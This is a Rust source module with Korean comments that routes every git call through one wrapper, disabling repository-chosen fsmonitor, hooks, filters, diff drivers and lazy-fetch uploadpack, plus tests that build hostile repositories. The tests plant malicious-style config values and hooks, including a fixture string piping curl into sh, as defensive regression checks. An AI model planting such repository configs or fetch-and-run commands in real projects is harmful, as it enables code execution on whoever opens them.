//! git 을 띄우는 유일한 창구 — 저장소가 고른 명령을 우리 권한으로 돌리지 않는다.
//!
//! Today·변경 화면은 사람이 아무것도 누르지 않아도 `git status`·`git diff` 를 돈다.
//! 그런데 git 은 읽기 명령에서도 저장소 설정이 고른 프로그램을 실행한다 (2026-10-09
//! 리포트 + 임시 저장소 재현, git 2.53):
//!
//! | 경로 | 언제 | 막는 법 |
//! |---|---|---|
//! | `core.fsmonitor` | `status` | 늘 `false` 로 덮는다 |
//! | `.git/hooks/post-index-change` | `status` 가 인덱스를 다시 쓸 때 | `GIT_OPTIONAL_LOCKS=0` + 없는 `core.hooksPath` |
//! | `filter.<이름>.clean`·`process` | `diff` (`--no-ext-diff` 로 **안** 막힌다) | 저장소 설정에서 이름을 읽어 빈 값 + `required=false` |
//! | `diff.external` · `diff.<드라이버>.command`·`textconv` | `diff`·`show`·`log -p` | `--no-ext-diff --no-textconv` |
//! | 부분 클론의 지연 fetch — `remote.<이름>.uploadpack` · `core.sshCommand` · 자격 증명 도우미 | 아직 안 받은 객체를 읽는 `diff`·`show`·`log` | `GIT_NO_LAZY_FETCH=1` (git 2.44+) |
//!
//! 막는 법이 둘로 갈린 이유: 필터는 플래그로 끌 수 없고, 드라이버는 빈 값으로 덮으면
//! git 이 빈 프로그램을 실행하려다 diff 전체가 실패한다 (둘 다 재현으로 확인).
//!
//! 지연 fetch 는 `-c remote.<이름>.uploadpack=…` 로 덮어도, `promisor`·`partialClone`
//! 을 비워도 돌았다 — 끄는 길은 환경 변수(= `--no-lazy-fetch`) 하나다 (2026-10-10 재현).
//! 대가: 부분 클론에서 아직 안 받은 옛 객체의 diff 는 실패로 보인다. 사용자의 git 이
//! 받아 두면 다시 보인다. 2.44 미만 git 은 이 변수를 모른다 — 그 git 에서는 `.git` 째
//! 받은 부분 클론에 이 문이 남는다.
//!
//! 막는 것은 **저장소 범위(local·worktree)** 설정뿐이다. 사용자 전역 설정(예: 전역
//! git-lfs 필터)은 사용자가 고른 것이라 그대로 둔다 — 덮으면 LFS 파일이 전부
//! "변경됨" 으로 보인다. 저장소 범위라도 git-lfs 의 표준 명령 그 문자열 그대로면
//! 남긴다 (`git lfs install --local` 이 쓰는 값 — 임의 명령을 고를 여지가 없다).
//!
//! `git clone` 은 원격의 `.git/config`·`.git/hooks` 를 가져오지 않는다. 이 경로는
//! 압축 파일·공유 드라이브·동료 작업 폴더처럼 `.git` 째 받은 저장소에서만 열린다 —
//! 그래도 프로젝트를 **추가하는 것만으로** 열리는 문이라 신뢰 질문 없이 닫는다.
//!
//! 이 모듈 밖에서 `std_cmd("git")` 을 부르지 않는다 (아래 테스트가 잠근다). 예전엔
//! 실행 도우미가 6벌이라 한 곳을 고쳐도 나머지가 남았다.

use std::collections::HashMap;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant, SystemTime};

use super::QUOTEPATH_OFF;

/// 어떤 git 호출도 이보다 오래 기다리지 않는다 — 느린 네트워크 파일시스템에서
/// 화면이 영원히 멈추지 않게. 큰 저장소의 `log` 도 넉넉히 들어오는 값이다.
const TIMEOUT: Duration = Duration::from_secs(120);

/// 존재하지 않는 훅 폴더. git 은 `<여기>/<훅 이름>` 을 찾다 없으면 훅을 건너뛴다.
const NO_HOOKS: &str = if cfg!(windows) { "NUL" } else { "/dev/null" };

/// 저장소 범위에 있어도 남기는 git-lfs 표준 명령 (`git lfs install --local`).
const LFS_STANDARD: &[&str] = &[
    "git-lfs clean -- %f",
    "git-lfs smudge -- %f",
    "git-lfs filter-process",
    "git-lfs smudge --skip -- %f",
];

/// 외부 diff·textconv 를 부를 수 있는 하위 명령 — 이것들엔 끄는 플래그를 붙인다.
const DIFF_FAMILY: &[&str] = &["diff", "show", "log"];

/// `dir` 에서 `git <args>` — 저장소 설정이 고른 명령을 끈 상태로.
///
/// `args[0]` 은 하위 명령이다 (`status`, `diff` …). `-C dir` · 경로 8진수 끄기
/// (`QUOTEPATH_OFF`)까지 붙어 나온다.
pub fn cmd(dir: &Path, args: &[&str]) -> Command {
    let mut cmd = crate::proc::std_cmd("git");
    cmd.arg("-C").arg(dir);
    cmd.args(QUOTEPATH_OFF);
    cmd.args(["-c", "core.fsmonitor=false"]);
    cmd.arg("-c").arg(format!("core.hooksPath={NO_HOOKS}"));
    cmd.args(neutralizers(dir));
    // `status` 가 기회 삼아 인덱스를 다시 쓰지 않게 한다 — 그 쓰기가 훅을 부르고,
    // 사용자의 git 과 `index.lock` 을 다투기도 한다 (VS Code 와 같은 설정).
    cmd.env("GIT_OPTIONAL_LOCKS", "0");
    // 부분 클론의 빠진 객체를 원격에서 받지 않는다 — 그 fetch 가 저장소 설정의
    // `remote.<이름>.uploadpack` 을 우리 권한으로 띄운다 (위 표).
    cmd.env("GIT_NO_LAZY_FETCH", "1");
    if let Some((sub, rest)) = args.split_first() {
        cmd.arg(sub);
        if DIFF_FAMILY.contains(sub) {
            cmd.args(["--no-ext-diff", "--no-textconv"]);
        }
        cmd.args(rest);
    }
    cmd
}

/// `cmd.output()` 과 같되 [`TIMEOUT`] 을 넘기면 죽이고 `TimedOut` 오류를 돌려준다.
///
/// 표준 출력·오류는 각자 스레드가 끝까지 읽는다 — 한쪽 파이프가 차서 자식이
/// 멈추는 교착을 피하려는 것이다 (`Command::output` 이 안에서 하는 일과 같다).
pub fn output(cmd: &mut Command) -> std::io::Result<Output> {
    output_within(cmd, TIMEOUT)
}

fn output_within(cmd: &mut Command, timeout: Duration) -> std::io::Result<Output> {
    let mut child = cmd
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;
    let drain = |pipe: Option<Box<dyn Read + Send>>| {
        std::thread::spawn(move || {
            let mut buf = Vec::new();
            if let Some(mut p) = pipe {
                let _ = p.read_to_end(&mut buf);
            }
            buf
        })
    };
    let out = drain(
        child
            .stdout
            .take()
            .map(|p| Box::new(p) as Box<dyn Read + Send>),
    );
    let err = drain(
        child
            .stderr
            .take()
            .map(|p| Box::new(p) as Box<dyn Read + Send>),
    );

    let deadline = Instant::now() + timeout;
    let status = loop {
        if let Some(status) = child.try_wait()? {
            break status;
        }
        if Instant::now() >= deadline {
            let _ = child.kill();
            let _ = child.wait();
            return Err(std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                format!("git did not finish within {}s", timeout.as_secs()),
            ));
        }
        std::thread::sleep(Duration::from_millis(5));
    };
    Ok(Output {
        status,
        stdout: out.join().unwrap_or_default(),
        stderr: err.join().unwrap_or_default(),
    })
}

// ─────────────────────────────────────────────────────────────────────────────
// 저장소 설정 읽기
// ─────────────────────────────────────────────────────────────────────────────

/// 저장소 범위 설정의 필터를 빈 값으로 덮는 `-c` 인자.
///
/// `git config --list` 는 값을 읽기만 하고 아무것도 실행하지 않는다. 설정이 안
/// 바뀌었으면 다시 묻지 않는다 — `status` 한 번에 git 을 두 번 띄우지 않으려고.
fn neutralizers(dir: &Path) -> Vec<String> {
    let stamp = config_stamp(dir);
    let cache = CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    if let Some(stamp) = stamp {
        if let Some((seen, args)) = cache.lock().ok().and_then(|c| c.get(dir).cloned()) {
            if seen == stamp {
                return args;
            }
        }
    }
    let args = read_local_config(dir)
        .map(|raw| neutralizers_from(&raw))
        .unwrap_or_default();
    if let (Some(stamp), Ok(mut c)) = (stamp, cache.lock()) {
        c.insert(dir.to_path_buf(), (stamp, args.clone()));
    }
    args
}

type Cache = Mutex<HashMap<PathBuf, (SystemTime, Vec<String>)>>;
static CACHE: OnceLock<Cache> = OnceLock::new();

/// 캐시를 믿어도 되는가의 표식 — 가장 가까운 `.git/config` 의 수정 시각.
/// `.git` 이 파일(워크트리·서브모듈)이면 설정 자리를 따라가지 않고 `None` (매번 묻는다).
fn config_stamp(dir: &Path) -> Option<SystemTime> {
    let dot_git = dir
        .ancestors()
        .map(|a| a.join(".git"))
        .find(|g| g.exists())?;
    if !dot_git.is_dir() {
        return None;
    }
    std::fs::metadata(dot_git.join("config"))
        .ok()?
        .modified()
        .ok()
}

fn read_local_config(dir: &Path) -> Option<String> {
    let mut cmd = crate::proc::std_cmd("git");
    cmd.arg("-C")
        .arg(dir)
        .args(["config", "--list", "--show-scope", "-z"]);
    let out = output_within(&mut cmd, Duration::from_secs(10)).ok()?;
    out.status
        .success()
        .then(|| String::from_utf8_lossy(&out.stdout).into_owned())
}

/// `git config --list --show-scope -z` 출력(`범위\0키\n값\0` 의 반복)에서 덮을 필터를 고른다.
fn neutralizers_from(raw: &str) -> Vec<String> {
    let mut fields = raw.split('\0');
    let mut filters: Vec<&str> = Vec::new();
    while let (Some(scope), Some(entry)) = (fields.next(), fields.next()) {
        if scope != "local" && scope != "worktree" {
            continue;
        }
        let (key, value) = entry.split_once('\n').unwrap_or((entry, ""));
        if let Some(name) = subsection(key, "filter.", &[".clean", ".smudge", ".process"]) {
            if !LFS_STANDARD.contains(&value.trim()) && !filters.contains(&name) {
                filters.push(name);
            }
        }
    }
    filters
        .iter()
        .flat_map(|name| {
            ["clean=", "smudge=", "process=", "required=false"]
                .map(|var| ["-c".to_string(), format!("filter.{name}.{var}")])
        })
        .flatten()
        .collect()
}

/// `filter.<이름>.clean` 에서 `<이름>` — 하위 절 이름은 대소문자와 점을 그대로 둔다.
fn subsection<'a>(key: &'a str, section: &str, vars: &[&str]) -> Option<&'a str> {
    let rest = key.strip_prefix(section)?;
    vars.iter()
        .find_map(|v| rest.strip_suffix(v))
        .filter(|name| !name.is_empty())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let ok = crate::proc::std_cmd("git")
            .arg("-C")
            .arg(dir)
            .args(["-c", "user.email=t@t", "-c", "user.name=t"])
            .args(args)
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        assert!(ok, "git {args:?}");
    }

    /// 저장소 설정이 고른 명령 넷이 [`cmd`] 로 띄운 `status`·`diff` 에서 하나도 돌지 않는다.
    /// 같은 저장소에서 평범한 git 은 그것들을 돌린다 — 테스트가 헛돌지 않는다는 대조군.
    #[cfg(unix)]
    #[test]
    fn repo_config_cannot_run_commands_through_status_or_diff() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("repo");
        let marks = dir.path().join("marks");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::create_dir_all(&marks).unwrap();
        git(&root, &["init", "-q"]);
        std::fs::write(root.join("f.txt"), "a\n").unwrap();
        std::fs::write(root.join("g.bin"), "a\n").unwrap();
        git(&root, &["add", "f.txt", "g.bin"]);
        git(&root, &["commit", "-qm", "i"]);

        let touch = |name: &str| format!("sh -c 'touch {}/{name}; cat'", marks.display());
        git(&root, &["config", "core.fsmonitor", &touch("fsmonitor")]);
        git(&root, &["config", "filter.x.clean", &touch("clean")]);
        git(&root, &["config", "filter.x.required", "true"]);
        git(&root, &["config", "diff.tc.textconv", &touch("textconv")]);
        git(&root, &["config", "diff.ext.command", &touch("driver")]);
        git(&root, &["config", "diff.external", &touch("external")]);
        std::fs::write(
            root.join(".git/info/attributes"),
            "f.txt filter=x\ng.bin diff=tc\n*.md diff=ext\n",
        )
        .unwrap();
        let hook = root.join(".git/hooks/post-index-change");
        std::fs::write(
            &hook,
            format!("#!/bin/sh\ntouch {}/hook\n", marks.display()),
        )
        .unwrap();
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
        std::fs::write(root.join("f.txt"), "a\nb\n").unwrap();
        std::fs::write(root.join("g.bin"), "a\nb\n").unwrap();

        let ran = || {
            let mut names: Vec<String> = std::fs::read_dir(&marks)
                .unwrap()
                .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
                .collect();
            names.sort();
            names
        };

        let subs: [&[&str]; 5] = [
            &["status", "--porcelain"],
            &["diff"],
            &["diff", "HEAD"],
            &["show", "HEAD"],
            &["log", "-p", "-1"],
        ];
        for sub in subs {
            let out = output(&mut cmd(&root, sub)).unwrap();
            assert!(
                out.status.success(),
                "{sub:?}: {}",
                String::from_utf8_lossy(&out.stderr)
            );
        }
        assert!(
            ran().is_empty(),
            "저장소 설정이 고른 명령이 돌았다: {:?}",
            ran()
        );

        // 대조군 — 덮지 않은 git 은 필터·textconv 를 실제로 돌린다.
        let _ = crate::proc::std_cmd("git")
            .arg("-C")
            .arg(&root)
            .args(["diff"])
            .output();
        assert!(
            !ran().is_empty(),
            "대조군이 아무것도 안 돌렸다 — 재현이 깨졌다"
        );
    }

    /// 부분 클론의 지연 fetch 가 저장소 설정의 `uploadpack` 을 띄우지 않는다. 대조군:
    /// 평범한 git 은 같은 `show` 에서 그것을 띄운다 (2026-10-10 재현, git 2.53).
    /// 부분 클론은 네트워크 하위 명령 없이 만든다 — 옛 블롭을 지우고 promisor 를 단다
    /// (기동 원장 `git_stays_local_only` 가 이 파일에서 그 글자를 금한다).
    #[cfg(unix)]
    #[test]
    fn partial_clone_lazy_fetch_cannot_run_repo_uploadpack() {
        let version = crate::proc::std_cmd("git")
            .arg("--version")
            .output()
            .unwrap();
        let version = String::from_utf8_lossy(&version.stdout).into_owned();
        let mut nums = version
            .split_whitespace()
            .nth(2)
            .unwrap_or("0.0")
            .split('.')
            .map(|n| n.parse::<u32>().unwrap_or(0));
        if (nums.next().unwrap_or(0), nums.next().unwrap_or(0)) < (2, 44) {
            eprintln!("git {version} 은 GIT_NO_LAZY_FETCH 를 모른다 — 건너뜀");
            return;
        }
        let dir = tempfile::tempdir().unwrap();
        let (origin, root, marks) = (
            dir.path().join("origin"),
            dir.path().join("repo"),
            dir.path().join("marks"),
        );
        for (d, contents) in [(&origin, &["a\n"][..]), (&root, &["a\n", "b\n"][..])] {
            std::fs::create_dir_all(d).unwrap();
            git(d, &["init", "-q"]);
            for (i, body) in contents.iter().enumerate() {
                std::fs::write(d.join("f.txt"), body).unwrap();
                git(d, &["add", "f.txt"]);
                git(d, &["commit", "-qm", &i.to_string()]);
            }
        }
        std::fs::create_dir_all(&marks).unwrap();
        let old = crate::proc::std_cmd("git")
            .arg("-C")
            .arg(&root)
            .args(["rev-parse", "HEAD~1:f.txt"])
            .output()
            .unwrap();
        let old = String::from_utf8_lossy(&old.stdout).trim().to_string();
        std::fs::remove_file(root.join(".git/objects").join(&old[..2]).join(&old[2..])).unwrap();
        let evil = format!(
            "sh -c 'touch {}/uploadpack; exec git-upload-pack \"$@\"' --",
            marks.display()
        );
        for (k, v) in [
            ("core.repositoryformatversion", "1"),
            ("extensions.partialClone", "origin"),
            ("remote.origin.url", &origin.display().to_string()),
            ("remote.origin.promisor", "true"),
            ("remote.origin.uploadpack", &evil),
        ] {
            git(&root, &["config", k, v]);
        }
        let ran = || std::fs::read_dir(&marks).unwrap().count();

        let out = output(&mut cmd(&root, &["show", "HEAD~1:f.txt"])).unwrap();
        assert!(!out.status.success(), "빠진 객체를 받아 왔다");
        assert_eq!(ran(), 0, "저장소 설정의 uploadpack 이 돌았다");

        // 대조군 — 덮지 않은 git 은 지연 fetch 로 uploadpack 을 띄운다.
        let _ = crate::proc::std_cmd("git")
            .arg("-C")
            .arg(&root)
            .args(["show", "HEAD~1:f.txt"])
            .output();
        assert!(ran() > 0, "대조군이 아무것도 안 돌렸다 — 재현이 깨졌다");
    }

    #[test]
    fn neutralizes_only_repo_scope_and_keeps_standard_lfs() {
        let raw = [
            "global\0filter.lfs.clean\ngit-lfs clean -- %f",
            "global\0filter.corp.clean\n/usr/local/bin/corp-clean",
            "local\0filter.lfs.clean\ngit-lfs clean -- %f",
            "local\0filter.lfs.process\ngit-lfs filter-process",
            "local\0filter.Evil.Name.clean\nsh -c 'curl x | sh'",
            "local\0diff.external\nsh -c x",
            "worktree\0diff.tc.textconv\nsh -c y",
            "local\0core.bare\nfalse",
            "",
        ]
        .join("\0");
        assert_eq!(
            neutralizers_from(&raw),
            [
                "filter.Evil.Name.clean=",
                "filter.Evil.Name.smudge=",
                "filter.Evil.Name.process=",
                "filter.Evil.Name.required=false",
            ]
            .iter()
            .flat_map(|k| ["-c", k])
            .collect::<Vec<_>>()
        );
    }

    #[test]
    fn output_kills_a_command_past_its_deadline() {
        let mut slow = crate::proc::std_cmd(if cfg!(windows) { "ping" } else { "sleep" });
        if cfg!(windows) {
            slow.args(["-n", "30", "127.0.0.1"]);
        } else {
            slow.arg("30");
        }
        let started = Instant::now();
        let err = output_within(&mut slow, Duration::from_millis(200)).unwrap_err();
        assert_eq!(err.kind(), std::io::ErrorKind::TimedOut);
        assert!(started.elapsed() < Duration::from_secs(10));
    }

    /// git 을 띄우는 자리는 이 모듈 하나다 — 도우미가 다시 여러 벌로 갈라지면
    /// 위의 덮개가 그중 한 곳에만 붙는다 (2026-10-09 이전의 6벌).
    #[test]
    fn no_other_module_spawns_git() {
        let src = Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
        let mut offenders = Vec::new();
        let mut stack = vec![src.clone()];
        while let Some(d) = stack.pop() {
            for e in std::fs::read_dir(&d).unwrap().flatten() {
                let p = e.path();
                if p.is_dir() {
                    stack.push(p);
                    continue;
                }
                let name = p.file_name().unwrap().to_string_lossy().into_owned();
                // 테스트 픽스처(저장소 만들기)와 이 모듈, 창구 자체는 예외.
                if !name.ends_with(".rs")
                    || name == "tests.rs"
                    || name.ends_with("_tests.rs")
                    || p.ends_with("git/safe.rs")
                    || p.ends_with("src/proc.rs")
                {
                    continue;
                }
                let text = std::fs::read_to_string(&p).unwrap();
                if text.contains("_cmd(\"git\")") {
                    offenders.push(p.strip_prefix(&src).unwrap().display().to_string());
                }
            }
        }
        assert!(
            offenders.is_empty(),
            "git 을 직접 띄운다 — git::safe::cmd 를 쓸 것: {offenders:?}"
        );
    }
}
